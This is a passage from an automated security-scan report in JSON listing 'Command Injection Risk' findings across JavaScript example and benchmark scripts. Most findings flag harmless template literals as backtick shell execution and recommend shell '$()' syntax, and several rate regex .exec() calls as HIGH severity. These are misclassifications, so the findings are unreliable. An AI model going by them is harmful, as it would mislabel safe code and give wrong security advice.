        "evidence": "lines.push(`  Avg Query Size: ${stats.sizes.avgQuerySize.toFixed(0)}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/graphql-schema-design/resources/scripts/benchmark_queries.js",
        "line_number": 266,
        "issue": "Backtick command execution",
        "evidence": "lines.push(`  Avg Response Size: ${stats.sizes.avgResponseSize.toFixed(0)}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/graphql-schema-design/resources/scripts/benchmark_queries.js",
        "line_number": 273,
        "issue": "Backtick command execution",
        "evidence": "lines.push(`  - ${error}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/graphql-schema-design/resources/scripts/benchmark_queries.js",
        "line_number": 276,
        "issue": "Backtick command execution",
        "evidence": "lines.push(`  ... and ${stats.errors.length - 10} more`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cloud/aws-lambda-deployment/resources/examples/node/dynamodb_trigger.js",
        "line_number": 17,
        "issue": "Backtick command execution",
        "evidence": "console.error(`Error processing record ${record.eventID}:`, error);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cloud/aws-lambda-deployment/resources/examples/node/dynamodb_trigger.js",
        "line_number": 27,
        "issue": "Backtick command execution",
        "evidence": "message: `Processed ${event.Records.length} records`,",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cloud/aws-lambda-deployment/resources/examples/node/dynamodb_trigger.js",
        "line_number": 36,
        "issue": "Backtick command execution",
        "evidence": "console.log(`Processing ${eventName} event from ${tableName}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cloud/aws-lambda-deployment/resources/examples/node/dynamodb_trigger.js",
        "line_number": 49,
        "issue": "Backtick command execution",
        "evidence": "console.warn(`Unknown event type: ${eventName}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cloud/aws-lambda-deployment/resources/examples/node/dynamodb_trigger.js",
        "line_number": 64,
        "issue": "Backtick command execution",
        "evidence": "message: `New item created: ${JSON.stringify(item)}`,",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cloud/aws-lambda-deployment/resources/examples/node/dynamodb_trigger.js",
        "line_number": 84,
        "issue": "Backtick command execution",
        "evidence": "console.log(`Status changed: ${oldItem.status} -> ${newItem.status}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cloud/aws-lambda-deployment/resources/examples/node/dynamodb_trigger.js",
        "line_number": 88,
        "issue": "Backtick command execution",
        "evidence": "message: `Item ${newItem.id} status: ${oldItem.status} -> ${newItem.status}`,",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/realtime/websocket-implementation/resources/examples/node/websocket-server.js",
        "line_number": 114,
        "issue": "Backtick command execution",
        "evidence": "console.log(`Client ${ws.id} joined room: ${room} (${rooms.get(room).size} members)`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/realtime/websocket-implementation/resources/examples/node/websocket-server.js",
        "line_number": 143,
        "issue": "Backtick command execution",
        "evidence": "console.log(`Client ${ws.id} left room: ${ws.room}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/realtime/websocket-implementation/resources/examples/node/websocket-server.js",
        "line_number": 189,
        "issue": "Backtick command execution",
        "evidence": "console.log(`Message in room ${ws.room}: ${data.content} (sent to ${sent} clients)`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/realtime/websocket-implementation/resources/examples/node/websocket-server.js",
        "line_number": 207,
        "issue": "Backtick command execution",
        "evidence": "console.log(`Broadcast: ${data.content} (sent to ${sent} clients)`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/realtime/websocket-implementation/resources/examples/node/websocket-server.js",
        "line_number": 241,
        "issue": "Backtick command execution",
        "evidence": "ws.userId = `user_${ws.id.slice(0, 8)}`;",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/realtime/websocket-implementation/resources/examples/node/websocket-server.js",
        "line_number": 248,
        "issue": "Backtick command execution",
        "evidence": "console.log(`Client connected: ${ws.id} (${req.socket.remoteAddress})`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/realtime/websocket-implementation/resources/examples/node/websocket-server.js",
        "line_number": 289,
        "issue": "Backtick command execution",
        "evidence": "console.error(`Error handling ${msg.type}:`, e);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/realtime/websocket-implementation/resources/examples/node/websocket-server.js",
        "line_number": 298,
        "issue": "Backtick command execution",
        "evidence": "error: `Unknown message type: ${msg.type}`",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/realtime/websocket-implementation/resources/examples/node/websocket-server.js",
        "line_number": 312,
        "issue": "Backtick command execution",
        "evidence": "console.log(`Client disconnected: ${ws.id} (code: ${code}, reason: ${reason.toString()})`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/realtime/websocket-implementation/resources/examples/node/websocket-server.js",
        "line_number": 317,
        "issue": "Backtick command execution",
        "evidence": "console.error(`Client error (${ws.id}):`, error.message);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/realtime/websocket-implementation/resources/examples/node/websocket-server.js",
        "line_number": 325,
        "issue": "Backtick command execution",
        "evidence": "console.log(`Terminating inactive connection: ${ws.id}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/realtime/websocket-implementation/resources/examples/node/websocket-server.js",
        "line_number": 361,
        "issue": "Backtick command execution",
        "evidence": "console.log(`WebSocket server running on ws://localhost:${PORT}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/realtime/websocket-implementation/resources/examples/node/websocket-server.js",
        "line_number": 362,
        "issue": "Backtick command execution",
        "evidence": "console.log(`Health check: http://localhost:${PORT}/health`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/realtime/websocket-implementation/resources/examples/node/websocket-server.js",
        "line_number": 363,
        "issue": "Backtick command execution",
        "evidence": "console.log(`Metrics: http://localhost:${PORT}/metrics`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/realtime/websocket-implementation/resources/examples/node/websocket-client.js",
        "line_number": 53,
        "issue": "Backtick command execution",
        "evidence": "console.log(`Connecting to ${this.url}...`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/realtime/websocket-implementation/resources/examples/node/websocket-client.js",
        "line_number": 103,
        "issue": "Backtick command execution",
        "evidence": "console.log(`Flushing message queue (${this.messageQueue.length} messages)`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/realtime/websocket-implementation/resources/examples/node/websocket-client.js",
        "line_number": 176,
        "issue": "Backtick command execution",
        "evidence": "console.log(`Disconnected: code=${code}, reason=${reason.toString()}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/realtime/websocket-implementation/resources/examples/node/websocket-client.js",
        "line_number": 227,
        "issue": "Backtick command execution",
        "evidence": "console.log(`Reconnecting in ${actualDelay}ms (attempt ${this.reconnectAttempts})`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/realtime/websocket-implementation/resources/examples/node/websocket-client.js",
        "line_number": 274,
        "issue": "Backtick command execution",
        "evidence": "content: `Hello at ${new Date().toISOString()}`",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/realtime/websocket-implementation/resources/examples/node/websocket-client.js",
        "line_number": 281,
        "issue": "Backtick command execution",
        "evidence": "console.log(`[EVENT] Disconnected: ${code} - ${reason}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/realtime/websocket-implementation/resources/examples/node/websocket-client.js",
        "line_number": 285,
        "issue": "Backtick command execution",
        "evidence": "console.log(`[EVENT] Reconnecting (attempt ${attempt}, delay ${delay}ms)`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/http2-multiplexing/resources/examples/node/http2-server.js",
        "line_number": 28,
        "issue": "Backtick command execution",
        "evidence": "console.log(`Request: ${headers[':method']} ${path}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/http2-multiplexing/resources/examples/node/http2-server.js",
        "line_number": 211,
        "issue": "Backtick command execution",
        "evidence": "stream.end(`Content for ${requestPath}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/http2-multiplexing/resources/examples/node/http2-server.js",
        "line_number": 288,
        "issue": "Backtick command execution",
        "evidence": "console.log(`Response for ${path}: ${headers[':status']}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/http2-multiplexing/resources/examples/node/http2-server.js",
        "line_number": 297,
        "issue": "Backtick command execution",
        "evidence": "console.log(`${path} complete (${data.length} bytes)`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/http2-multiplexing/resources/examples/node/http2-server.js",
        "line_number": 321,
        "issue": "Backtick command execution",
        "evidence": "console.log(`${method} ${path}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/http2-multiplexing/resources/examples/node/http2-server.js",
        "line_number": 364,
        "issue": "Backtick command execution",
        "evidence": "name: `User ${userId}`",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/mqtt-messaging/resources/examples/node/mqtt_client.js",
        "line_number": 17,
        "issue": "Backtick command execution",
        "evidence": "clientId: options.clientId || `mqtt_client_${Math.random().toString(16).slice(2, 10)}`,",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/mqtt-messaging/resources/examples/node/mqtt_client.js",
        "line_number": 36,
        "issue": "Backtick command execution",
        "evidence": "console.log(`\u2713 Connected to ${this.brokerUrl}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/mqtt-messaging/resources/examples/node/mqtt_client.js",
        "line_number": 37,
        "issue": "Backtick command execution",
        "evidence": "console.log(`  Session present: ${connack.sessionPresent}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/mqtt-messaging/resources/examples/node/mqtt_client.js",
        "line_number": 48,
        "issue": "Backtick command execution",
        "evidence": "console.error(`\u2717 Connection error: ${error.message}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/mqtt-messaging/resources/examples/node/mqtt_client.js",
        "line_number": 69,
        "issue": "Backtick command execution",
        "evidence": "console.log(`\ud83d\udce5 [${topic}] (QoS ${qos}, retain=${retain}): ${message.substring(0, 100)}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/mqtt-messaging/resources/examples/node/mqtt_client.js",
        "line_number": 85,
        "issue": "Backtick command execution",
        "evidence": "console.error(`\u2717 Subscribe failed: ${err.message}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/mqtt-messaging/resources/examples/node/mqtt_client.js",
        "line_number": 88,
        "issue": "Backtick command execution",
        "evidence": "console.log(`\u2713 Subscribed to ${topic} (granted QoS: ${granted[0].qos})`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/mqtt-messaging/resources/examples/node/mqtt_client.js",
        "line_number": 106,
        "issue": "Backtick command execution",
        "evidence": "console.error(`\u2717 Publish failed: ${err.message}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/mqtt-messaging/resources/examples/node/mqtt_client.js",
        "line_number": 109,
        "issue": "Backtick command execution",
        "evidence": "console.log(`\u2713 Published to ${topic}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/mqtt-messaging/resources/examples/node/mqtt_client.js",
        "line_number": 176,
        "issue": "Backtick command execution",
        "evidence": "console.log(`Handler: ${topic} -> ${payload}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/resources/amqp-rabbitmq/examples/nodejs/consumer_with_retry.js",
        "line_number": 107,
        "issue": "Backtick command execution",
        "evidence": "console.log(`Attempt ${retryCount + 1}/${maxRetries + 1}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/resources/amqp-rabbitmq/examples/nodejs/consumer_with_retry.js",
        "line_number": 130,
        "issue": "Backtick command execution",
        "evidence": "console.log(`Retrying (attempt ${retryCount + 1}/${maxRetries})...`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/resources/amqp-rabbitmq/examples/nodejs/consumer_with_retry.js",
        "line_number": 148,
        "issue": "Backtick command execution",
        "evidence": "console.log(`\\nConsuming from queue: ${this.queueName}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/http3-quic/resources/examples/cloudflare_worker_http3.js",
        "line_number": 164,
        "issue": "Backtick command execution",
        "evidence": "message: `Event ${i}`",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/react-state-management/resources/scripts/benchmark_renders.js",
        "line_number": 57,
        "issue": "Backtick command execution",
        "evidence": "const node = new ComponentTree(`Component-${i}`, i, 'useState');",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/react-state-management/resources/scripts/benchmark_renders.js",
        "line_number": 81,
        "issue": "Backtick command execution",
        "evidence": "const node = new ComponentTree(`Consumer-${i}`, i, 'context');",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/react-state-management/resources/scripts/benchmark_renders.js",
        "line_number": 112,
        "issue": "Backtick command execution",
        "evidence": "const node = new ComponentTree(`OptConsumer-${i}`, i, 'contextOptimized');",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/react-state-management/resources/scripts/benchmark_renders.js",
        "line_number": 165,
        "issue": "Backtick command execution",
        "evidence": "const node = new ComponentTree(`ZustandComp-${i}`, i, 'zustand');",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/react-state-management/resources/scripts/benchmark_renders.js",
        "line_number": 206,
        "issue": "Backtick command execution",
        "evidence": "const node = new ComponentTree(`JotaiComp-${i}`, i, 'jotai');",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/react-state-management/resources/scripts/benchmark_renders.js",
        "line_number": 283,
        "issue": "Backtick command execution",
        "evidence": "console.error(`Running benchmarks with depth=${config.depth}, updates=${config.updates}...`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/react-state-management/resources/scripts/benchmark_renders.js",
        "line_number": 316,
        "issue": "Backtick command execution",
        "evidence": "const avgTime = `${result.avgTimePerUpdate}ms`.padEnd(15);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/react-state-management/resources/scripts/benchmark_renders.js",
        "line_number": 320,
        "issue": "Backtick command execution",
        "evidence": "lines.push(`${pattern} | ${avgTime} | ${avgRenders} | ${totalRenders}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/react-state-management/resources/scripts/benchmark_renders.js",
        "line_number": 330,
        "issue": "Backtick command execution",
        "evidence": "lines.push(`  Best: ${best.pattern} (${best.avgRendersPerUpdate} renders/update)`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/react-state-management/resources/scripts/benchmark_renders.js",
        "line_number": 331,
        "issue": "Backtick command execution",
        "evidence": "lines.push(`  Worst: ${worst.pattern} (${worst.avgRendersPerUpdate} renders/update)`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/react-state-management/resources/scripts/benchmark_renders.js",
        "line_number": 332,
        "issue": "Backtick command execution",
        "evidence": "lines.push(`  Ratio: ${ratio}x difference`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/react-state-management/resources/scripts/detect_unnecessary_renders.js",
        "line_number": 31,
        "issue": "Backtick command execution",
        "evidence": "console.error(`Error analyzing ${file}:`, error.message);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "HIGH",
        "category": "Command Injection Risk",
        "file": "skills/frontend/react-state-management/resources/scripts/detect_unnecessary_renders.js",
        "line_number": 99,
        "issue": "exec() usage",
        "evidence": "// NOTE: .exec() is regex pattern matching, not command execution - no security risk",
        "recommendation": "Avoid exec() or strictly validate input"
      },
      {
        "severity": "HIGH",
        "category": "Command Injection Risk",
        "file": "skills/frontend/react-state-management/resources/scripts/detect_unnecessary_renders.js",
        "line_number": 100,
        "issue": "exec() usage",
        "evidence": "while ((match = functionPattern.exec(content)) !== null) {",
        "recommendation": "Avoid exec() or strictly validate input"
      },
      {
        "severity": "HIGH",
        "category": "Command Injection Risk",
        "file": "skills/frontend/react-state-management/resources/scripts/detect_unnecessary_renders.js",
        "line_number": 111,
        "issue": "exec() usage",
        "evidence": "while ((match = arrowPattern.exec(content)) !== null) {",
        "recommendation": "Avoid exec() or strictly validate input"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/react-state-management/resources/scripts/detect_unnecessary_renders.js",
        "line_number": 181,
        "issue": "Backtick command execution",
        "evidence": "message: `${matches.length} inline object props detected. Extract to variables or useMemo.`,",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/react-state-management/resources/scripts/detect_unnecessary_renders.js",
        "line_number": 198,
        "issue": "Backtick command execution",
        "evidence": "message: `${arrayMatches.length} inline array props detected. Extract to variables or useMemo.`,",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/react-state-management/resources/scripts/detect_unnecessary_renders.js",
        "line_number": 227,
        "issue": "Backtick command execution",
        "evidence": "message: `Component has ${propCount} props but is not memoized. Consider React.memo.`,",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/react-state-management/resources/scripts/detect_unnecessary_renders.js",
        "line_number": 246,
        "issue": "Backtick command execution",
        "evidence": "message: `${matches.length} inline callbacks detected. Consider useCallback for expensive child components.`,",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "HIGH",
        "category": "Command Injection Risk",
        "file": "skills/frontend/react-state-management/resources/scripts/detect_unnecessary_renders.js",
        "line_number": 260,
        "issue": "exec() usage",
        "evidence": "while ((match = useMemoPattern.exec(content)) !== null) {",
        "recommendation": "Avoid exec() or strictly validate input"
      },
      {
        "severity": "HIGH",
        "category": "Command Injection Risk",
        "file": "skills/frontend/react-state-management/resources/scripts/detect_unnecessary_renders.js",
        "line_number": 280,
        "issue": "exec() usage",
        "evidence": "while ((match = useCallbackPattern.exec(content)) !== null) {",
        "recommendation": "Avoid exec() or strictly validate input"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/react-state-management/resources/scripts/detect_unnecessary_renders.js",
        "line_number": 312,
        "issue": "Backtick command execution",
        "evidence": "message: `Component uses ${matches.length} contexts. Consider consolidating or using a state library.`,",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/react-state-management/resources/scripts/detect_unnecessary_renders.js",
        "line_number": 344,
        "issue": "Backtick command execution",
        "evidence": "message: `${expensiveOps} expensive operations detected without useMemo. Consider memoization.`,",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/react-state-management/resources/scripts/detect_unnecessary_renders.js",
        "line_number": 409,
        "issue": "Backtick command execution",
        "evidence": "lines.push(`  Total issues: ${report.summary.total}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/react-state-management/resources/scripts/detect_unnecessary_renders.js",
        "line_number": 410,
        "issue": "Backtick command execution",
        "evidence": "lines.push(`  Errors: ${report.summary.error}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/react-state-management/resources/scripts/detect_unnecessary_renders.js",
        "line_number": 411,
        "issue": "Backtick command execution",
        "evidence": "lines.push(`  Warnings: ${report.summary.warning}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/react-state-management/resources/scripts/detect_unnecessary_renders.js",
        "line_number": 412,
        "issue": "Backtick command execution",
        "evidence": "lines.push(`  Info: ${report.summary.info}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/react-state-management/resources/scripts/detect_unnecessary_renders.js",
        "line_number": 424,
        "issue": "Backtick command execution",
        "evidence": "lines.push(`  ${type}: ${issues.length}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/react-state-management/resources/scripts/detect_unnecessary_renders.js",
        "line_number": 441,
        "issue": "Backtick command execution",
        "evidence": "lines.push(`File: ${file}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/react-state-management/resources/scripts/detect_unnecessary_renders.js",
        "line_number": 453,
        "issue": "Backtick command execution",
        "evidence": "lines.push(`  Component: ${component}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/react-state-management/resources/scripts/detect_unnecessary_renders.js",
        "line_number": 457,
        "issue": "Backtick command execution",
        "evidence": "lines.push(`    [${severity}] Line ${issue.line}: ${issue.message}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/react-state-management/resources/scripts/detect_unnecessary_renders.js",
        "line_number": 530,
        "issue": "Backtick command execution",
        "evidence": "console.error(`Error: Directory ${directory} does not exist`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/react-state-management/resources/scripts/detect_unnecessary_renders.js",
        "line_number": 535,
        "issue": "Backtick command execution",
        "evidence": "console.error(`Error: ${directory} is not a directory`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/react-state-management/resources/scripts/detect_unnecessary_renders.js",
        "line_number": 539,
        "issue": "Backtick command execution",
        "evidence": "console.error(`Analyzing React components in ${directory}...`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/web-accessibility/resources/scripts/test_keyboard_nav.js",
        "line_number": 124,
        "issue": "Backtick command execution",
        "evidence": "result.addTest('page-load', false, `Failed to load page: ${error.message}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/web-accessibility/resources/scripts/test_keyboard_nav.js",
        "line_number": 185,
        "issue": "Backtick command execution",
        "evidence": "`All ${elements.total} interactive elements are focusable`,",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/web-accessibility/resources/scripts/test_keyboard_nav.js",
        "line_number": 191,
        "issue": "Backtick command execution",
        "evidence": "`${elements.nonFocusable.length} of ${elements.total} interactive elements are not focusable`,",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/web-accessibility/resources/scripts/test_keyboard_nav.js",
        "line_number": 196,
        "issue": "Backtick command execution",
        "evidence": "result.addTest('focusable-elements', false, `Test failed: ${error.message}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/web-accessibility/resources/scripts/test_keyboard_nav.js",
        "line_number": 274,
        "issue": "Backtick command execution",
        "evidence": "`Found ${positiveTabIndex.length} elements with positive tabindex (anti-pattern)`,",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/web-accessibility/resources/scripts/test_keyboard_nav.js",
        "line_number": 282,
        "issue": "Backtick command execution",
        "evidence": "`Tab order tested with ${tabOrder.length} focusable elements`,",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/web-accessibility/resources/scripts/test_keyboard_nav.js",
        "line_number": 287,
        "issue": "Backtick command execution",
        "evidence": "result.addTest('tab-order', false, `Test failed: ${error.message}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/web-accessibility/resources/scripts/test_keyboard_nav.js",
        "line_number": 334,
        "issue": "Backtick command execution",
        "evidence": "`All ${indicators.total} focusable elements have visible focus indicators`,",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/web-accessibility/resources/scripts/test_keyboard_nav.js",
        "line_number": 340,
        "issue": "Backtick command execution",
        "evidence": "`${indicators.missingIndicators.length} of ${indicators.total} elements lack visible focus indicators`,",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
